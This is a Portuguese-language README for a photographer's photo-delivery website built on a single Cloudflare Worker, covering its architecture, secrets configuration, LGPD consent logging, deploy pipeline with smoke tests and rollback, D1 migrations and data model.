# fotos.lucafchala.com

Galeria pública de fotos do fotógrafo Luca F. Chala — site de **entrega** de fotos, painel administrativo, Termos de Uso com **autorização de uso de imagem** registrada (LGPD), solicitação de remoção de fotos, métricas, backup e PWA. Roda em **um único Cloudflare Worker** com **Workers KV** como banco principal e um banco **Cloudflare D1** para o registro de consentimento. Não há build step, framework nem dependências runtime — só JavaScript puro renderizando HTML no servidor.

URL de produção: <https://fotos.lucafchala.com>

> ### 👋 Voltando ao projeto depois de um tempo?
>
> Comece por **[RETOMADA.md](./RETOMADA.md)**, não por aqui. São dez minutos e
> cobre o que verificar antes de mexer, as sete armadilhas que já custaram horas
> nesta base, e onde olhar quando algo quebra.
>
> Este README é a **referência completa** — bom para consultar, denso demais para
> reconstruir contexto.

---

## Sumário

- [Visão geral](#visão-geral)
- [Stack e arquitetura](#stack-e-arquitetura)
- [Como rodar localmente](#como-rodar-localmente)
- [Verificação (rodar o site de verdade)](./docs/VERIFICACAO.md)
- [Configuração (KV, secrets, env vars)](#configuração-kv-secrets-env-vars)
- [Deploy](#deploy)
  - [Migrações do D1](#migrações-do-d1)
- [Estrutura de arquivos](#estrutura-de-arquivos)
- [Modelo de dados (KV)](#modelo-de-dados-kv)
- [Rotas HTTP](#rotas-http)
- [Páginas públicas](#páginas-públicas)
- [Cartão de pré-visualização do link (Open Graph)](#cartão-de-pré-visualização-do-link-open-graph)
- [Painel administrativo `/dashboard`](#painel-administrativo-dashboard)
- [Sistema de solicitação de remoção (LGPD)](#sistema-de-solicitação-de-remoção-lgpd)
- [Termos de Uso e autorização de uso de imagem (LGPD)](#termos-de-uso-e-autorização-de-uso-de-imagem-lgpd)
- [Autenticação e segurança](#autenticação-e-segurança)
- [Conformidade legal (LGPD)](#conformidade-legal-lgpd)
- [Páginas dos documentos legais](#páginas-dos-documentos-legais)
- [E-mails transacionais (Resend)](#e-mails-transacionais-resend)
- [Métricas](#métricas)
- [Backup e restauração](#backup-e-restauração)
- [PWA, ícones e analytics](#pwa-ícones-e-analytics)
- [Health check e CI](#health-check-e-ci)
- [Rate limiting](#rate-limiting)
- [Convenções e detalhes do código](#convenções-e-detalhes-do-código)
- [Como o Drive vira foto na página](#como-o-drive-vira-foto-na-página)
- [Limitações conhecidas](#limitações-conhecidas)
- [Roadmap (TODO.md)](#roadmap-todomd)

---

## Visão geral

O site tem três audiências:

1. **Visitante público** — abre `/` para ver a galeria de projetos, clica num card para abrir a página do projeto (`/<slug>`), vê descrição, fotos de capa em carrossel e um botão "Acessar fotos" que abre uma modal com o gate de acesso: verificação Turnstile (pré-carregada assim que a página abre) + aceite dos Termos. Só depois de passar por esse gate — validado no servidor, não no cliente — o link real do Drive é liberado (`POST /api/drive-link`); o botão registra um clique (métrica) e abre o Drive em nova aba. Se a foto pertence a alguém que prefere remover, há um formulário de solicitação de remoção no rodapé.
2. **Cliente / contato** — abre `/suporte` para entrar em contato por WhatsApp, e-mail direto ou formulário (que envia e-mail via Resend para o admin).
3. **Admin (Luca)** — entra em `/dashboard`, autentica com senha (PBKDF2, sessão de 24h em cookie HTTP-only), gerencia eventos (CRUD), ordena, destaca um como featured, marca como "em breve", oculta da galeria, define status de produção, vê métricas de views e cliques no Drive, baixa/restaura backup JSON, troca senha e responde solicitações de remoção (cada "resolver" dispara um e-mail de confirmação ao solicitante).

Cada evento contém: slug (URL), título, descrição curta/longa, até 6 fotos de capa, link da pasta do Drive, data, créditos, link extra, status (em-edição/em-revisão/entregue/arquivado), notas privadas, flags `visible`/`comingSoon`/`pinned`, e um "banner de novas fotos" opcional com expiração configurável.

O design é totalmente dark (`#0a0a0a` base, `#f0ebe5` texto), fonte Inter (Google Fonts), sem JS framework — apenas vanilla. Todo HTML é gerado server-side via template strings em ES modules e enviado com `Content-Type: text/html; charset=utf-8`.

---

## Stack e arquitetura

| Camada | Tecnologia |
| --- | --- |
| Runtime | Cloudflare Workers (V8 isolates, sem Node.js) |
| Banco | Cloudflare Workers KV — namespace `FOTOS` (estado principal) + Cloudflare **D1** (`CONSENT_DB`) para o log de consentimento |
| Auth | PBKDF2-SHA256 (100k iterações) + sessão HTTP-only em KV |
| E-mail | Resend API (`https://api.resend.com/emails`) |
| Frontend | HTML/CSS/JS renderizado no Worker (sem build) |
| Dev tooling | Wrangler ≥ 4 (`npm run dev` / `npm run deploy`), Vitest (`npm test`), ESLint (`npm run lint`) — **Node ≥ 22** |
| CI/CD | GitHub Actions (`deploy.yml`: portão completo → versão sem tráfego → **smoke no preview** → promoção → smoke em produção → tag; `checks.yml`: lint, tipos, testes, cobertura, bundle dry-run) |
| Retenção | Cron diário (`scheduled`) apaga solicitações de remoção resolvidas > 180 dias |
| Fontes externas | Google Fonts (Inter) |
| Imagens | Hospedadas no Google Drive, servidas via `lh3.googleusercontent.com/d/<fileId>` (thumbnails da galeria pedem variante `=w600`/`=w1600`) |
| Analytics | Cloudflare Web Analytics beacon (opcional, controlado por `CF_ANALYTICS_TOKEN`) |
| Anti-bot | Cloudflare Turnstile (modo *managed*) protege os formulários e a liberação do link do Drive |
| Consentimento | Aceite dos Termos antes do acesso ao Drive, registrado em D1 (`image_use_consent`), retenção ~5 anos |
| Monitoramento | Uptime Kuma (homelab) via heartbeat push a cada requisição — `GET https://homelab.lucafchala.com/api/push/{ID}?status=up&ping={latency}` em background (`ctx.waitUntil`) |

**Sem ORM, sem JSX/React, sem bundler.** O estado principal é uma única chave KV `events` (array JSON de todos os eventos), mais chaves de sessão/contador/rate-limit/categorias. Um banco **D1** (SQLite) guarda apenas o log append-only de consentimento de uso de imagem (`image_use_consent`). As páginas HTML são strings literais geradas em runtime — fácil de ler, fácil de mudar, zero overhead de build.

O fluxo de uma requisição é:

```
Request → fetch(request, env, ctx) em src/index.js
  ↓ roteamento por path + método (cadeia de ifs)
  ↓ handler chama getEvents(env) ou outro helper
  ↓ chamada(s) a env.FOTOS.get/put/delete
  ↓ função em src/ui/*.js gera HTML
  ↓ wrapper html(content) adiciona headers de segurança
  ↓ Response
```

---

## Como rodar localmente

**Requer Node.js ≥ 22** (`engines` no `package.json`). O wrangler 4 declara
`node >= 22` e simplesmente se recusa a rodar em versões anteriores — os
workflows do CI usam a mesma versão, de propósito.

```bash
# 1. Instalar dependências de dev (wrangler, vitest, eslint)
npm install

# 2. Login no Cloudflare (uma vez por máquina)
npx wrangler login

# 3. (Só se você editou algo em docs/legal/ ou SECURITY.md)
#    Regerar o módulo com o texto dos documentos legais. A CI falha se você
#    esquecer — ver "Páginas dos documentos legais".
npm run build:legal

# 4. Subir o dev server
npm run dev
```

Antes de abrir PR:

```bash
npm test     # Vitest — 98 testes, ~1 s
npm run lint # ESLint sobre src/ e tests/
```

O Wrangler escuta em `http://localhost:8787`. Por padrão ele se conecta ao KV **remoto** (id em `wrangler.toml`); para usar KV local, rode `npx wrangler dev --local`.

**Importante:** mesmo em dev, o dashboard exige uma senha. No primeiro acesso a `/dashboard`, se a chave KV `admin_password` não existir, a tela de login vira tela de setup ("Criar senha de acesso"). Defina uma e o app salva o hash PBKDF2.

Para resetar a senha em dev: `npx wrangler kv key delete admin_password --binding=FOTOS`
(a forma antiga `kv:key` com dois-pontos saiu no wrangler 4).

---

## Configuração (KV, secrets, env vars)

### `wrangler.toml`

```toml
name = "fotos"
main = "src/index.js"
compatibility_date = "2024-11-01"
account_id = "e5869d6881e992cf4681ce85583a6ab2"

[[kv_namespaces]]
binding = "FOTOS"
id = "4d2c399e77804f3a82b66e4ec0a7fa5e"

# Log de consentimento de uso de imagem. Remover este bloco torna
# env.CONSENT_DB indefinido e a gravação um no-op seguro.
[[d1_databases]]
binding = "CONSENT_DB"
database_name = "fotos-consent"
database_id = "d6bed362-4ddf-459d-a088-48b42aa11fdc"
migrations_dir = "migrations"

[triggers]
# Diário 03:00 UTC — purga solicitações resolvidas + consentimentos expirados.
crons = ["0 3 * * *"]

[env.preview]
name = "fotos-preview"
```

O binding `FOTOS` é referenciado em todo o código como `env.FOTOS`. Para fork pessoal: crie um KV namespace novo (`npx wrangler kv namespace create FOTOS`) e troque o `id`.

### Variáveis de ambiente / secrets

Definir via `npx wrangler secret put <NAME>` (ficam criptografados no Cloudflare).

| Nome | Obrigatório? | Para que serve |
| --- | --- | --- |
| `RESEND_API_KEY` | Não (sem ela, e-mails são pulados silenciosamente) | API key do Resend para enviar notificações de remoção, confirmações e formulário de suporte |
| `ADMIN_EMAIL` | Necessário se `RESEND_API_KEY` definido | Destinatário das notificações de admin (remoções, suporte) |
| `CF_ANALYTICS_TOKEN` | Não | Token do Cloudflare Web Analytics. Quando presente, o script `beacon.min.js` é injetado nas páginas públicas |
| `ADMIN_PASSWORD` | Apenas em deploy novo / KV zerado | Semeia a senha do dashboard quando `admin_password` não existe no KV. **Não há mais setup público de primeira execução** — sem KV e sem este secret, o login fica bloqueado |
| `TURNSTILE_SECRET_KEY` | Sim (fail-closed) | Verificação Turnstile do formulário de suporte e remoção de fotos. Se ausente, esses formulários são bloqueados |
| `SIGNING_SECRET` | **Sim, na prática** | Assina o nonce de página do `/api/drive-link` e o token dos formulários públicos (HMAC-SHA256, sem estado). Ver o aviso abaixo |
| `KUMA_PUSH_URL` | Não | URL de push do Uptime Kuma (`https://<host>/api/push/<token>`), para o heartbeat de disponibilidade. Sem ela o heartbeat não acontece e nada mais muda. **É uma credencial**: o token do monitor está embutido na URL, e quem o tem consegue manter um monitor verde sobre um serviço caído — por isso ela não mora no código, que é público |

> ### ⚠️ `SIGNING_SECRET` falha **aberto**, não fechado
>
> Ao contrário dos demais, a ausência deste secret **não quebra nada**: o nonce
> de página e o token de formulário simplesmente deixam de ser exigidos, e o
> site continua servindo como se estivesse protegido.
>
> A escolha é deliberada. Um secret faltando é erro de configuração de deploy, e
> falhar fechado aqui significaria "ninguém baixa foto nenhuma" — uma
> indisponibilidade total causada por uma camada *adicional*, empilhada sobre
> defesas que continuam de pé (Turnstile fail-closed, rate limit, consentimento).
> O contrapeso é nunca ser silencioso: `auditSite()` acusa a falta, e ela aparece
> em `/api/healthz` e no painel de status até alguém rodar:
>
> ```bash
> # Gere um valor forte em vez de inventar um — 32 caracteres é o PISO:
> openssl rand -base64 48 | npx wrangler secret put SIGNING_SECRET
> ```
>
> Trocar o secret invalida os tokens em voo — o visitante recarrega a página e o
> cliente já trata isso sozinho. É o comportamento desejado numa rotação.
>
> #### "Criei o secret" não é o mesmo que "o secret está configurado"
>
> `wrangler secret put` aceita **valor vazio sem reclamar**. O secret passa a
> existir no painel da Cloudflare, a pessoa risca o item da lista, e nada está
> protegido. Por isso `signingSecretProblem()` — a **única** função que decide o
> assunto — recusa três estados, e o `/api/healthz` diz qual deles é o caso:
>
> | Valor | O que o `/api/healthz` diz | Por quê |
> | --- | --- | --- |
> | binding ausente | `NÃO EXISTE neste Worker` | Não chegou — provavelmente salvo no Worker errado (há um `fotos-preview`) |
> | vazio | `EXISTE neste Worker, mas o valor está VAZIO` | O nome está lá e o valor não; recriar colando o valor |
> | só espaço / `\n` | `EXISTE, mas só contém espaço em branco (N)` | Seria *truthy* em JS e viraria chave HMAC de verdade, com o painel dizendo que está tudo certo — o **falso verde** |
> | < 32 caracteres | `curto demais (N de 32)` | Cai numa varredura offline a partir de um único token assinado; daí em diante dá para forjar nonce e token de formulário |
>
> **Cada estado tem uma mensagem própria de propósito.** A primeira versão dizia
> `ausente ou vazio` para os dois primeiros, e isso custou um ciclo inteiro de
> investigação em produção: o secret aparecia na lista do painel, o site lia
> vazio, e a mensagem não dizia qual dos dois era — sendo que eles pedem ações
> opostas (criar vs. recriar). O agravante: **o painel da Cloudflare não mostra
> o valor de um secret**, então esta mensagem é a *única* coisa capaz de
> distingui-los. Não existe segunda fonte para consultar.
>
> O valor passa por `trim()` antes de virar chave, para que um newline colado por
> acidente não gere uma chave diferente da que você acha que configurou.
>
> O relatório do painel lê **da mesma função** que decide se a chave é usada.
> Antes eram duas perguntas separadas (`!!env.SIGNING_SECRET` de um lado,
> `signingSecret()` do outro) sobre o mesmo fato — e duas opiniões sobre um fato
> só divergem no dia em que uma muda, com o painel ficando verde sobre um segredo
> que o código de assinatura recusa.

Variáveis lidas como `env.<NOME>` dentro de `fetch(request, env, ctx)`.

### Banco D1 — log de consentimento (`CONSENT_DB`)

O aceite dos Termos / autorização de uso de imagem é gravado num banco **Cloudflare D1** (free tier). O binding fica **comentado** em `wrangler.toml` por padrão — enquanto não existir, `env.CONSENT_DB` é `undefined` e o registro de consentimento vira **no-op seguro** (o resto do site funciona normalmente). Para ativar:

```bash
# 1. cria o banco (imprime o database_id)
npx wrangler d1 create fotos-consent
# 2. cole o id e descomente o bloco [[d1_databases]] (binding = "CONSENT_DB") em wrangler.toml
# 3. aplica a migração que cria a tabela image_use_consent
npx wrangler d1 migrations apply fotos-consent --remote
```

A migração vive em `migrations/0001_consent.sql`. Retenção: o cron diário apaga linhas com mais de ~5 anos (`CONSENT_RETENTION_DAYS`, em `src/index.js`).

### Turnstile

Use o widget no modo **managed** (painel da Cloudflare) para verificação sem atrito (sem desafio visível na maioria dos acessos). O `TURNSTILE_SECRET_KEY` é verificado server-side em `/api/drive-link` (fail-closed — sem ele, o link do Drive nunca é liberado), no formulário de remoção e no suporte.

---

## Monitoramento (Uptime Kuma)

Fotos envia um **heartbeat** para Uptime Kuma (rodando no homelab) a cada requisição HTTP, permitindo que o status dashboard (`status.lucafchala.com`) veja que fotos está up.

```
fetch('https://homelab.lucafchala.com/api/push/{ID}?status=up&msg=OK&ping={latency}')
  └─ Executa em background com ctx.waitUntil
  └─ Timeout 5s, falhas logadas (não afeta resposta do visitante)
```

O heartbeat:
- ✅ Envia latência (`ping`) para Kuma calcular tendência
- ✅ Usa o mesmo endpoint que monitorar de fora teria (Kuma push)
- ✅ Zero overhead: corre em paralelo, não bloqueia

**No status dashboard:** A página checa se `homelab.lucafchala.com` está acessível (verificando a Tunnel), sinaliza Kuma como up/degraded/down baseado nisso, e emite alertas se o homelab ficar offline.

---

## Deploy

**A versão é verificada antes de qualquer cliente vê-la.** Esse é o ponto do
pipeline, e é o que ele *não* fazia antes: `wrangler deploy` publicava direto e
o smoke test rodava depois, então um smoke vermelho já era um incidente — este
README dizia isso com todas as letras.

Hoje o fluxo é **subir a versão sem tráfego → testar a URL de preview →
promover a mesma versão**. Se o smoke reprovar, produção nunca soube que existiu
uma versão nova.

### 1. Automático (push na `main`)

`.github/workflows/deploy.yml`:

| # | Etapa | O que garante |
| --- | --- | --- |
| 1 | `npm ci` + versão do wrangler derivada de `node_modules` | A produção sobe pela versão que os testes usaram |
| 2 | `lint` + `typecheck` + `test` | Portão completo, não só `npm test` — os dois primeiros já pegaram defeito que a suíte não pega |
| 3 | `scripts/d1-migrate.mjs` | Schema existe antes de o código novo servir qualquer requisição — e **para o deploy** se não existir |
| 4 | `POST .../subdomain` (Preview URLs) | Garante o pré-requisito do portão em vez de supô-lo |
| 5 | `versions upload --tag <sha>` | Publica a versão **sem rotear tráfego**; a URL de preview é derivada do ID e **testada** antes de valer |
| 6 | **`scripts/smoke.sh <preview> --expect-configured`** | **O portão**, quando há URL de preview: 39 checagens antes de qualquer cliente. Sem ela, o passo é pulado e a verificação vira o item 9 |
| 7 | `versions deploy <id>@100` | Promove **a mesma versão** que passou — não uma recompilação |
| 8 | Espera por sinal (`healthz` 200), não por relógio | Substitui o `sleep 20`, que era chute nos dois sentidos |
| 9 | `scripts/smoke.sh <produção>` | Confirma a promoção — e **reprovar dispara `wrangler rollback` automático** |
| 10 | `git tag deploy-<data>-<sha>` | Rollback vira um SHA conhecido, sem depender de alguém lembrar |
| 11 | GitHub Release na mesma tag, com changelog automático | Registro navegável (aba **Releases**), sem curadoria manual — `continue-on-error`, mas nunca silencioso: falha vira `::warning::` no resumo, e não afeta o deploy (que já publicou e passou nos dois smokes) |

O resumo do job (aba **Actions** → run → topo) responde "o que foi para
produção e passou?" sem abrir log de step nenhum: commit, ID da versão, URL de
preview, tabela de todas as checagens, tag criada.

#### O que a primeira execução real ensinou

O pipeline acima estreou no merge do PR #108 e **falhou de propósito**, no
lugar certo: o `versions upload` funcionou, mas a Cloudflare não devolveu URL
de preview, e o portão recusou promover uma versão que não pôde verificar.
Produção seguiu servindo a versão anterior. Três defeitos vieram junto, e todos
estão corrigidos:

| Defeito | Por que passou despercebido | Correção |
| --- | --- | --- |
| Preview URLs desligadas no Worker | `preview_urls` é configuração **não-versionada**: `versions upload` só a lê, e com a chave ausente do `wrangler.toml` o valor do servidor prevalecia para sempre | `preview_urls = true` no `wrangler.toml` + passo que garante e **confere** o estado pela API antes de subir a versão |
| As mensagens de erro do portão nunca chegaram ao log | `grep` sem correspondência sai com 1; com `pipefail` e o `bash -e` do runner, o step morria **na atribuição**, antes dos `echo ::error` escritos para exatamente este caso | `\|\| true` na atribuição, e o shell dos workflows passou a ser conferido no `checks.yml` |
| A regex casava com qualquer `*.workers.dev` | Incluindo a rota de **produção** — se as Preview URLs estivessem ligadas, o "portão" teria testado produção e aprovado a si mesmo | Ancorado no rótulo `Version Preview URL:`, com o formato `<8-hex>-<worker>` como reserva |

E um quarto, que o portão só tornou visível: `d1 migrations apply` falhava com
`duplicate column name: access_type` **em todo deploy desde 09/08**, engolido
por um `continue-on-error`. Detalhe em [Migrações do D1](#migrações-do-d1).

#### E o que a segunda ensinou

O run #136 passou pelas migrações e pelas Preview URLs, e parou de novo no
upload — pelo mesmo sintoma, por uma causa diferente e mais fundamental.

O passo novo leu o estado do servidor e confirmou `previews_enabled: true`,
antes **e** depois. Mesmo assim o wrangler não imprimiu a URL. A explicação está
nas duas condições que ele exige:

```js
if (versionId && hasPreview) {                       // hasPreview = metadata.has_preview
  const { previews_enabled } = await fetch(`${worker}/subdomain`);
  if (previews_enabled) { … }                        // este estava true
}
```

Quem barra é `hasPreview`, que vem de `metadata.has_preview` na resposta do
upload e é decidido **inteiramente do lado do servidor**: não há flag do
wrangler nem chave de configuração que o mude. Esperar por ele é esperar por
algo que não controlamos.

Só que a URL é **derivável**. O próprio wrangler a monta como
`https://<8 primeiros do id>-<worker>.<subdominio>.workers.dev`, e o subdomínio
sai de `GET /accounts/<id>/workers/subdomain`. Então o workflow passou a
construí-la — e, o que importa, a **provar** que ela responde antes de aceitá-la.
Uma URL construída que não responde é descartada como se não existisse.

Derivar-e-provar é evidência melhor que a flag que estávamos esperando:
`has_preview` diz o que a API acha; um 200 diz o que existe.

E o desfecho do (4) foi o melhor possível: as duas colunas responderam
**`já estava:`**. Não havia perda de registro de consentimento — só o
livro-razão desatualizado. Depois do conserto, `✅ No migrations to apply!`.

#### E o que a terceira encerrou

O run #137 rodou a URL derivada e ela respondeu **404, vinte vezes, por ~60 s**.
Não é timeout nem falha de conexão: a Cloudflare atende no curinga
`*.workers.dev` e diz que ali não há nada. Somado a `previews_enabled: true`
(lido no servidor em duas execuções) e a `has_preview` falso, o veredito é um
só: **este Worker não recebe URL de preview de versão**, e não há chave de
configuração que mude isso.

Três execuções, três causas distintas, e a terceira não é defeito nosso.

**O que se decidiu, e por quê.** Um portão que nunca pode passar não é
segurança: é a garantia de que ninguém publica, e o convite a contornar o
workflow por fora — pior que qualquer coisa que o portão evitaria. Então ele
passou a ser **oportunista, nunca silencioso**:

| Situação | O que acontece |
| --- | --- |
| Veio URL de preview | Smoke **antes** de promover. Reprovou, ninguém promove. Cliente nenhum vê. |
| Não veio (hoje) | Promove, verifica em seguida e **reverte sozinho** se o smoke reprovar. |

A segunda é mais fraca — a exposição é de segundos, não zero. Mas é automática,
não depende de alguém perceber, e é muito mais forte que o fluxo anterior a
este trabalho, em que um smoke vermelho marcava o deploy como falho **e ia
embora, deixando a versão ruim servindo**. O resumo do job diz qual dos dois
caminhos rodou, sempre.

E é reversível sozinho: no dia em que a Cloudflare servir preview para este
Worker, a sondagem acha a URL e o portão forte volta, sem mudar uma linha.

#### Reversão automática

Quando o smoke de produção reprova, o workflow chama `wrangler rollback` para a
versão que estava servindo (anotada **antes** da promoção) e só então falha o
job. E não considera o trabalho feito ao reverter: espera o `healthz` voltar a
200, porque uma reversão que não restaura é indistinguível de nenhuma reversão.

Os quatro desfechos, todos exercitados sob `bash -e` com a rede dublada:

| Caso | Resultado |
| --- | --- |
| Reversão limpa | `🔙 revertido` no resumo; job vermelho; o commit **não** está em produção |
| Sem ID anotado | Reverte no modo implícito do wrangler; idem |
| O `rollback` falha | `🚨` no resumo + instrução explícita de ação manual |
| Reverteu mas o site não voltou | `🚨` + "confira o site à mão" |

A tag de release só nasce quando o smoke de produção **passa** — senão o
repositório ganharia uma `deploy-…` apontando para um commit revertido. A
GitHub Release depende da mesma tag (via `steps.tag.outputs.tag`), então herda
a mesma garantia sem repetir a condição.

### Migrações do D1

`scripts/d1-migrate.mjs` substituiu a chamada direta ao
`wrangler d1 migrations apply`, por um motivo concreto.

Cada migração é enviada como *o conteúdo do arquivo* seguido do
`INSERT INTO d1_migrations`, tudo numa requisição — e o `/query` do D1 não é
transacional entre comandos. Uma execução que aplique o primeiro `ALTER TABLE`
e morra no segundo deixa a coluna no banco e **nada** no livro-razão. A partir
daí toda tentativa recomeça do primeiro `ALTER` e morre nele.

O custo não é o vermelho no log. É que `migrations apply` processa os arquivos
em ordem e para no primeiro erro: com a `0002` travada, uma `0003` nunca seria
aplicada — a próxima mudança de esquema entraria em produção sem o esquema, e o
sintoma apareceria num `INSERT`, em runtime.

O script **retoma** a migração em vez de repeti-la. Para cada comando
pendente ele pergunta ao banco se aquele efeito já existe
(`SELECT "coluna" FROM "tabela" LIMIT 0` dá erro se, e somente se, a coluna
faltar), executa só o que falta — o comando original do arquivo, não um SQL
inventado — e só então registra o arquivo. Comando cujo efeito ele não saiba
verificar (`DROP`, `RENAME`, `UPDATE`, gatilho, view) faz o script **parar** e
dizer qual é: marcar como aplicada uma migração que não foi seria pior que o
problema original. A classificação é testada em `tests/d1-migrate.test.js`,
inclusive contra as migrações reais do repositório.

E o desfecho deixou de ser binário:

| Saída | Situação | Efeito no deploy |
| --- | --- | --- |
| `0` | Esquema no lugar | Segue |
| `75` | Indeterminado (rede, API, credencial) | Segue **com aviso** — entregar foto não pode depender do log de consentimento |
| `1` | Esquema quebrado ou irrecuperável | **Para**, antes de qualquer promoção |

O caso `1` é o que o `continue-on-error` escondia: promover código que grava
consentimento numa tabela sem as colunas perde, em silêncio, a prova de
autorização de uso de imagem.

### 2. Rodar o smoke você mesmo, antes de empurrar

É a parte que mais muda o dia a dia: o smoke deixou de viver dentro do YAML.

```bash
npx wrangler dev          # num terminal
npm run smoke:local       # no outro — 39 checagens contra o Worker de verdade
```

Mesma suíte, mesmos números, mesma saída que o CI usa. Também dá para apontar
para qualquer alvo:

```bash
npm run smoke -- https://<alguma-versao>.workers.dev --expect-configured
```

`--expect-configured` liga as checagens que dependem de secret (Turnstile,
Resend, `ADMIN_EMAIL`, `SIGNING_SECRET`, `/dashboard` respondendo 200). Sem ele,
o `wrangler dev` local passa limpo — lá não há secret nenhum, e isso é correto,
não falha.

E o empacotamento, sem credencial nenhuma:

```bash
npm run predeploy:check   # compila o bundle e resolve os bindings
```

Esse mesmo comando roda em **todo PR** (`checks.yml`), então `wrangler.toml`
quebrado ou binding removido reprovam antes do merge — antes, o `deploy.yml`
era o primeiro lugar onde um erro de empacotamento aparecia, e ele só roda
depois.

### 3. Manual, pelo GitHub (funciona do celular)

**Actions** → **Deploy** → **Run workflow**. Três entradas:

- **`promote`** (padrão ligado). Desligue para **só publicar e verificar**: a
  versão sobe, o smoke roda contra o preview e ela **não** recebe tráfego. O
  resumo imprime o `version_id` para promover depois. É o "deixa eu ver isso
  publicado antes de mandar para cliente" sem prazo para decidir.
- **`version_id`**. Promove uma versão **já existente**, pulando build e upload
  — é o rollback: segundos, sem recompilar e sem mexer no Git.
- **`unversioned`**. Publica com `wrangler deploy`, **sem** o portão de preview.
  Existe por um motivo só: `versions upload` não aplica migração de Durable
  Object (a API recusa com o código **10211**). Enquanto `[[migrations]]` tiver
  só a `v1` já aplicada, nunca é necessário. Quando entrar uma `v2`, o workflow
  falha no upload com a mensagem explicando — falhar alto é melhor que pular a
  verificação em silêncio.

### 4. Manual, pela linha de comando

```bash
npx wrangler deploy
```

Atalho de emergência. Pula suíte, migrações, portão de preview e smoke —
publica o que estiver na sua árvore, inclusive o que você esqueceu de commitar.
Prefira o Actions.

### Rollback

O caminho rápido não é mais Git:

**Actions** → **Deploy** → **Run workflow** → `version_id` = a versão boa
anterior (o resumo de cada deploy imprime o ID, e `npx wrangler versions list`
lista todas). Promove em segundos, sem recompilar.

Depois, para `main` e produção não ficarem divergentes, faça o revert no Git:

```bash
git revert <sha-ruim> && git push origin main
```

Duas coisas que o revert de código **não** desfaz:

- **Migrações D1 aplicadas.** Aditivas e idempotentes hoje; uma migração
  destrutiva futura exigiria plano próprio.
- **Dados já gravados** em KV/D1 pelo código novo. Continuam lá.

---

## Estrutura de arquivos

```
fotos/
├── README.md               ← este arquivo
├── TODO.md                 ← pendências em aberto (entregue sai de lá; histórico no git)
├── SECURITY.md             ← política de segurança, escopo, invariantes p/ contribuir
├── LEGAL.md                ← termos, licença de uso das fotos
├── package.json            ← scripts dev/deploy/lint/test; engines.node >= 22
├── eslint.config.js        ← flat config; lint cobre src/ e tests/
├── wrangler.toml           ← config do Worker, bindings KV + D1, cron diário
├── migrations/
│   ├── 0001_consent.sql    ← tabela D1 image_use_consent (log de consentimento)
│   └── 0002_access_type.sql← coluna access_type + declaração por tipo de acesso
├── docs/
│   └── legal/              ← pacote de conformidade LGPD (fonte da verdade dos textos)
│       ├── README.md       ← índice + aviso "não é parecer jurídico" + porte do agente
│       ├── ROPA.md         ← registro das operações (art. 37)
│       ├── RIPD.md         ← relatório de impacto / DPIA (art. 38)
│       ├── LIA.md          ← teste de legítimo interesse (art. 10)
│       ├── politica-de-retencao.md
│       ├── transferencia-internacional.md
│       ├── direitos-do-titular.md
│       ├── plano-resposta-incidentes.md
│       ├── politica-seguranca-informacao.md
│       ├── termo-autorizacao-uso-imagem.md
│       └── checklist-conformidade.md
├── scripts/
│   ├── build-legal-docs.mjs ← empacota os .md em src/content/legal-docs.js (npm run build:legal)
│   ├── smoke.sh             ← as 39 checagens; roda contra wrangler dev, preview ou produção (npm run smoke)
│   ├── d1-migrate.mjs       ← aplica/RETOMA as migrações do D1 e distingue "já estava" de "esquema quebrado"
│   └── verifica-shell-dos-workflows.py ← bash -n em cada bloco `run:` dos workflows
├── .github/
│   └── workflows/
│       ├── deploy.yml      ← CI: portão completo → migrações D1 → versão sem tráfego → smoke no PREVIEW → promoção → smoke em produção → tag
│       ├── checks.yml      ← CI: lint, tipos, testes, cobertura, bundle dry-run, sintaxe do shell
│       └── security.yml    ← CI: npm audit, dependency-review e invariantes de segurança
├── tests/                  ← Vitest (509 testes)
│   ├── index.test.js       ← backup/restore, normalizeEventFields, cronStale, auditSite
│   ├── drive-gate.test.js  ← handleDriveLink (cada recusa do gate + nonce de página), handlePerfBeacon, toCount
│   ├── kv.test.js          ← rate limit, getEvents/saveEvents, resiliência a KV corrompido
│   ├── utils.test.js       ← escape, toHttps/safeUrl, slug, datas, hash de senha, os 5 sendXEmail()
│   ├── healthz.test.js     ← handleHealthz, scheduled(), login (rate-limit/cookie), render de /sobre e /equipamentos
│   ├── d1-migrate.test.js  ← o que o retomador de migração aceita e, sobretudo, o que ele RECUSA
│   ├── rendered-pages.test.js ← HTML das páginas públicas e do painel, incluindo os pares cliente/servidor
│   ├── security.test.js    ← CSRF, CSP, tokens assinados, CSV, EXIF, sessão, markdown e páginas legais
│   └── workers/            ← suíte no workerd de verdade (Durable Objects, KV e D1 reais)
└── src/
    ├── index.js            ← roteador + todos os handlers HTTP (Worker entry)
    ├── utils.js            ← getEvents/saveEvents, hash, sessão, rate-limit, e-mails, TERMS_VERSION
    ├── security.js         ← cabeçalhos, CSP, CSRF, tokens HMAC, política de senha, honeypot
    ├── content/
    │   └── legal-docs.js   ← GERADO por scripts/build-legal-docs.mjs — não editar à mão
    └── ui/
        ├── gallery.js      ← HTML da galeria pública /
        ├── event.js        ← HTML da página de projeto /<slug>
        ├── dashboard.js    ← HTML do login e do painel admin /dashboard
        ├── support.js      ← HTML da página de suporte /suporte
        ├── privacy.js      ← HTML da Política de Privacidade /privacidade
        ├── terms.js        ← HTML dos Termos de Uso /termos
        ├── legal.js        ← HTML da Central de Transparência /legal
        ├── doc.js          ← HTML de cada documento legal /legal/<slug>
        ├── markdown.js     ← renderizador de markdown (escapa antes de formatar)
        ├── about.js        ← HTML de /sobre
        └── gear.js         ← HTML de /equipamentos
```

Tamanhos aproximados: `legal-docs.js` ~110 KB (texto dos documentos), `index.js` ~90 KB, `dashboard.js` ~85 KB (tem todo o JS do painel inline), `event.js` ~65 KB, `gallery.js` ~24 KB, `utils.js` ~28 KB, `legal.js` ~26 KB, `doc.js` ~10 KB, `support.js` ~10 KB, `security.js` ~14 KB, `markdown.js` ~9 KB. Tudo cabe folgadamente no limite de 10 MB do Workers script.

---

## Modelo de dados (KV)

Tudo vive numa única instância de KV (`binding = "FOTOS"`). Chaves usadas:

| Chave | Conteúdo | Quem escreve |
| --- | --- | --- |
| `events` | JSON: array com **todos** os eventos | `handleCreateEvent`, `handleUpdateEvent`, `handleDeleteEvent`, `handleRestoreBackup` |
| `admin_password` | String no formato `pbkdf2:<iter>:<saltHex>:<hashHex>` (ou SHA-256 legado, migrado no próximo login) | `handleLogin` (primeira vez ou setup), `handleChangePassword` |
| `admin_session:<token>` | String `"valid"` com `expirationTtl=86400` (24 h) | `handleLogin` ao sucesso; deletada no logout |
| `views:<slug>` | String numérica (contador de visualizações da página do projeto) | `handleEventPage` via `ctx.waitUntil` |
